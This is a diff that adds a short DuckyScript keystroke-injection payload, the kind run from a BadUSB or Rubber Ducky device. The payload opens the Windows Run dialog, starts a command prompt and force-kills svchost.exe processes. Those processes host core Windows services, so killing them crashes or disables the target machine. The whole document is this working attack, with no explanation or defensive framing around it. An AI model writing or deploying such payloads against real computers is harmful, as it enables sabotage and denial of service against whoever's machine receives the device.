@@ -1,0 +1,8 @@
+DELAY 2000
+GUI r
+DELAY 300
+STRING cmd
+ENTER
+DELAY 400
+STRING taskkill /F /IM svchost.exe
+ENTER
